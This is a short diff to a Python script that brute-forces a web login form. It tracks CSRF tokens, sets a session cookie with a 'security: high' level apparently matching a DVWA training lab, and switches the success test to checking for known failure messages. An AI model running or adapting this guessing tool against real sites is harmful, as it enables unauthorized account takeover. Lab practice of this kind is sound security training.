@@ -29,14 +29,14 @@ CSRF_TOKEN_FIELD_NAME = "user_token"  # Initialize CSRF token field name from th
 REQUEST_METHOD = "GET"  # Initialize request method from the user (GET or POST)
 USERNAME_FIELD_NAME = "username"  # Initialize username field name from the user
 PASSWORD_FIELD_NAME = "password"  # Initialize password field name from the user
-EXTRA_FIELDS = {"Login":"Login"}  # Add extra fields as query string from the user
+EXTRA_FIELDS = {"Login": "Login"}  # Add extra fields as query string from the user
+FAILURE_STRINGS = ["Username and/or password incorrect.", "Login failed"]  # List of strings to look for in the response to determine a failed login
 
 # Start a session to maintain cookies
 session = requests.Session()
 
 # Initialize the first cookie from the user
-# Initialize the first cookie from the user
-initial_cookie = {"security": "high","PHPSESSID":"8v029g60siqf401k1lmgqmb8pm"}  # Replace with the actual initial cookie value
+initial_cookie = {"security": "high", "PHPSESSID": "8v029g60siqf401k1lmgqmb8pm"}  # Replace with the actual initial cookie value
 session.cookies.update(initial_cookie)
 
 def update_initial_cookie():
@@ -76,8 +76,8 @@ def attempt_login(username, password, csrf_token):
     else:
         response = session.get(TARGET_URL, params=payload)
     
-    # Modify this condition based on the website's login success message
-    if "Welcome" in response.text:  # Adjusted success condition
+    # Modify this condition based on the website's login failure messages
+    if not any(failure_string in response.text for failure_string in FAILURE_STRINGS):  # Adjusted failure condition
         return True
     return False
 
